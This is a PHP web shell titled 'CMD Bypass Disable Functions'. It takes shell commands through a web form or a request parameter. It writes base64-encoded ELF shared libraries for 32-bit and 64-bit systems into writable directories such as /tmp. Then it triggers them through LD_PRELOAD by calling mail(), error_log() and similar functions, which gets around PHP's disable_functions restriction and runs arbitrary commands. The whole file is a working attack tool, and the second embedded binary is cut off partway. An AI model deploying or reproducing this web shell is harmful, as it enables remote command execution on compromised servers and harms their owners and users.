<?php
error_reporting(E_ALL);
@ini_set('memory_limit', '-1');
@ini_set('max_execution_time', '0');
@ini_set('output_buffering', '0');
@ini_set('implicit_flush', '1');
@set_time_limit(0);

$cmd = $_REQUEST["cmd"];

// Find a writable directory
function find_writable_dir() {
    $dirs = array(
        sys_get_temp_dir(),
        '/tmp',
        '/var/tmp',
        '/dev/shm',
        dirname(__FILE__),
        getcwd()
    );
    foreach ($dirs as $dir) {
        if (is_dir($dir) && is_writable($dir)) {
            return $dir;
        }
    }
    return false;
}

$tmpDir = find_writable_dir();
if ($tmpDir === false) {
    die("ERROR: No writable directory found!");
}

$outPath = $tmpDir . '/' . 'maillogs';
$soPath = $tmpDir . '/' . 'bypass.so';

if (!isset($_REQUEST['cmd'])) {
    echo '<!DOCTYPE html>
<html>
<head>
    <title>CMD Bypass Disable Functions</title>
    <style type="text/css">
        html, body {
            width: 100%;
            margin: 0;
            padding: 4px;
            box-sizing: border-box;
        }
        iframe {
            width: 100%;
            border: 0;
        }
        form input[type=text] {
            width: calc(100% - 90px);
        }
    </style>
</head>
<body>

<script type="text/javascript">
function reinitIframe() {
    var iframe = document.getElementById("test");
    try {
        var bHeight = iframe.contentWindow.document.body.scrollHeight;
        var dHeight = iframe.contentWindow.document.documentElement.scrollHeight;
        var height = Math.max(bHeight, dHeight);
        iframe.height = height;
        console.log(height);
    } catch (ex) {}
}
window.setInterval("reinitIframe()", 200);
</script>

<iframe name="output" frameborder="0" scrolling="no" id="test" onload="this.height=0"></iframe>
<form action="" method="post" target="output">
    <input type="text" name="cmd" value="uname -a">
    <input type="submit" value="Submit" style="border: 0 none;">
</form>

</body>
</html>';
    die();
}

// Trigger function for LD_PRELOAD - try multiple functions
function trigger_preload() {
    $disabled = array_map('trim', explode(',', ini_get('disable_functions')));
    
    if (function_exists('mail') && !in_array('mail', $disabled)) {
        mail('', '', '', '');
        return 'mail';
    } elseif (function_exists('error_log') && !in_array('error_log', $disabled)) {
        error_log('', 1, '', '');
        return 'error_log';
    } elseif (function_exists('mb_send_mail') && !in_array('mb_send_mail', $disabled)) {
        mb_send_mail('', '', '');
        return 'mb_send_mail';
    } elseif (function_exists('imap_mail') && !in_array('imap_mail', $disabled)) {
        imap_mail('', '', '');
        return 'imap_mail';
    }
    return false;
}

function is_64bit()
{
    $int = "9223372036854775807";
    $int = intval($int);
    if ($int == 9223372036854775807) {
        /* 64bit */
        return true;
    } elseif ($int == 2147483647) {
        /* 32bit */
        return false;
    } else {
        /* error */
        return "error";
    }
}

function release64()
{
    $content = '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AAAAAAMAEQAYCSAAAAAAAAAAAAAAAAAAAAAAAAMAEgAgCSAAAAAAAAAAAAAAAAAAAAAAAAMAEwAoCSAAAAAAAAAAAAAAAAAAAAAAAAMAFADoCiAAAAAAAAAAAAAAAAAAAAAAAAMAFQAYCyAAAAAAAAAAAAAAAAAAAAAAAAMAFgBYCyAAAAAAAAAAAAAAAAAAAAAAAAMAFwBgCyAAAAAAAAAAAAAAAAAAAAAAAAMAGAAAAAAAAAAAAAAAAAAAAAAAAQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAADAAAAAEAEgAgCSAAAAAAAAAAAAAAAAAAGQAAAAIACwDABgAAAAAAAAAAAAAAAAAALgAAAAIACwAABwAAAAAAAAAAAAAAAAAAQQAAAAIACwBQBwAAAAAAAAAAAAAAAAAAVwAAAAEAFwBgCyAAAAAAAAEAAAAAAAAAZgAAAAEAEQAYCSAAAAAAAAAAAAAAAAAAjQAAAAIACwCQBwAAAAAAAAAAAAAAAAAAmQAAAAEAEAAICSAAAAAAAAAAAAAAAAAAuAAAAAQA8f8AAAAAAAAAAAAAAAAAAAAAAQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAAzQAAAAEADwAACQAAAAAAAAAAAAAAAAAA2wAAAAEAEgAgCSAAAAAAAAAAAAAAAAAAAAAAAAQA8f8AAAAAAAAAAAAAAAAAAAAA5wAAAAEAFgBYCyAAAAAAAAAAAAAAAAAA9AAAAAEAEwAoCSAAAAAAAAAAAAAAAAAA/QAAAAEAFgBgCyAAAAAAAAAAAAAAAAAACQEAAAEAFQAYCyAAAAAAAAAAAAAAAAAAHwEAABIAAAAAAAAAAAAAAAAAAAAAAAAAMwEAACAAAAAAAAAAAAAAAAAAAAAAAAAATwEAABAAFgBgCyAAAAAAAAAAAAAAAAAAVgEAABIADABgCAAAAAAAAAAAAAAAAAAAXAEAABIAAAAAAAAAAAAAAAAAAAAAAAAAcAEAACAAAAAAAAAAAAAAAAAAAAAAAAAAfwEAABEAAAAAAAAAAAAAAAAAAAAAAAAAlAEAABAAFwBoCyAAAAAAAAAAAAAAAAAAmQEAABAAFwBgCyAAAAAAAAAAAAAAAAAApQEAABIACwDABwAAAAAAAJ0AAAAAAAAArQEAACAAAAAAAAAAAAAAAAAAAAAAAAAAwQEAABEAAAAAAAAAAAAAAAAAAAAAAAAA2AEAACAAAAAAAAAAAAAAAAAAAAAAAAAA8gEAACIAAAAAAAAAAAAAAAAAAAAAAAAADgIAABIACQA4BgAAAAAAAAAAAAAAAAAAFAIAABIAAAAAAAAAAAAAAAAAAAAAAAAAAGNydHN0dWZmLmMAX19KQ1JfTElTVF9fAGRlcmVnaXN0ZXJfdG1fY2xvbmVzAHJlZ2lzdGVyX3RtX2Nsb25lcwBfX2RvX2dsb2JhbF9kdG9yc19hdXgAY29tcGxldGVkLjY2NzAAX19kb19nbG9iYWxfZHRvcnNfYXV4X2ZpbmlfYXJyYXlfZW50cnkAZnJhbWVfZHVtbXkAX19mcmFtZV9kdW1teV9pbml0X2FycmF5X2VudHJ5AGJ5cGFzc19kaXNhYmxlZnVuYy5jAF9fRlJBTUVfRU5EX18AX19KQ1JfRU5EX18AX19kc29faGFuZGxlAF9EWU5BTUlDAF9fVE1DX0VORF9fAF9HTE9CQUxfT0ZGU0VUX1RBQkxFXwBnZXRlbnZAQEdMSUJDXzIuMi41AF9JVE1fZGVyZWdpc3RlclRNQ2xvbmVUYWJsZQBfZWRhdGEAX2ZpbmkAc3lzdGVtQEBHTElCQ18yLjIuNQBfX2dtb25fc3RhcnRfXwBlbnZpcm9uQEBHTElCQ18yLjIuNQBfZW5kAF9fYnNzX3N0YXJ0AHByZWxvYWQAX0p2X1JlZ2lzdGVyQ2xhc3NlcwBfX2Vudmlyb25AQEdMSUJDXzIuMi41AF9JVE1fcmVnaXN0ZXJUTUNsb25lVGFibGUAX19jeGFfZmluYWxpemVAQEdMSUJDXzIuMi41AF9pbml0AHN0cnN0ckBAR0xJQkNfMi4yLjUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABsAAAAHAAAAAgAAAAAAAACQAQAAAAAAAJABAAAAAAAAJAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAuAAAA9v//bwIAAAAAAAAAuAEAAAAAAAC4AQAAAAAAADwAAAAAAAAAAwAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAOAAAAAsAAAACAAAAAAAAAPgBAAAAAAAA+AEAAAAAAADIAQAAAAAAAAQAAAACAAAACAAAAAAAAAAYAAAAAAAAAEAAAAADAAAAAgAAAAAAAADAAwAAAAAAAMADAAAAAAAAygAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAABIAAAA////bwIAAAAAAAAAigQAAAAAAACKBAAAAAAAACYAAAAAAAAAAwAAAAAAAAACAAAAAAAAAAIAAAAAAAAAVQAAAP7//28CAAAAAAAAALAEAAAAAAAAsAQAAAAAAAAgAAAAAAAAAAQAAAABAAAACAAAAAAAAAAAAAAAAAAAAGQAAAAEAAAAAgAAAAAAAADQBAAAAAAAANAEAAAAAAAA8AAAAAAAAAADAAAAAAAAAAgAAAAAAAAAGAAAAAAAAABuAAAABAAAAEIAAAAAAAAAwAUAAAAAAADABQAAAAAAAHgAAAAAAAAAAwAAAAoAAAAIAAAAAAAAABgAAAAAAAAAeAAAAAEAAAAGAAAAAAAAADgGAAAAAAAAOAYAAAAAAAAaAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAHMAAAABAAAABgAAAAAAAABgBgAAAAAAAGAGAAAAAAAAYAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAAAAB+AAAAAQAAAAYAAAAAAAAAwAYAAAAAAADABgAAAAAAAJ0BAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAhAAAAAEAAAAGAAAAAAAAAGAIAAAAAAAAYAgAAAAAAAAJAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAIoAAAABAAAAAgAAAAAAAABpCAAAAAAAAGkIAAAAAAAAGAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAACSAAAAAQAAAAIAAAAAAAAAhAgAAAAAAACECAAAAAAAABwAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAoAAAAAEAAAACAAAAAAAAAKAIAAAAAAAAoAgAAAAAAABkAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAKoAAAAOAAAAAwAAAAAAAAAICSAAAAAAAAgJAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAAC2AAAADwAAAAMAAAAAAAAAGAkgAAAAAAAYCQAAAAAAAAgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAwgAAAAEAAAADAAAAAAAAACAJIAAAAAAAIAkAAAAAAAAIAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAMcAAAAGAAAAAwAAAAAAAAAoCSAAAAAAACgJAAAAAAAAwAEAAAAAAAAEAAAAAAAAAAgAAAAAAAAAEAAAAAAAAADQAAAAAQAAAAMAAAAAAAAA6AogAAAAAADoCgAAAAAAADAAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAA1QAAAAEAAAADAAAAAAAAABgLIAAAAAAAGAsAAAAAAABAAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAN4AAAABAAAAAwAAAAAAAABYCyAAAAAAAFgLAAAAAAAACAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAADkAAAACAAAAAMAAAAAAAAAYAsgAAAAAABgCwAAAAAAAAgAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAA6QAAAAEAAAAwAAAAAAAAAAAAAAAAAAAAYAsAAAAAAAAkAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAABEAAAADAAAAAAAAAAAAAAAAAAAAAAAAAIQLAAAAAAAA8gAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAABAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAB4DAAAAAAAAIgFAAAAAAAAGwAAACsAAAAIAAAAAAAAABgAAAAAAAAACQAAAAMAAAAAAAAAAAAAAAAAAAAAAAAAABIAAAAAAAAoAgAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAA==';
    global $soPath;
    file_put_contents($soPath, base64_decode($content));
}

function release86()
{
    $content = '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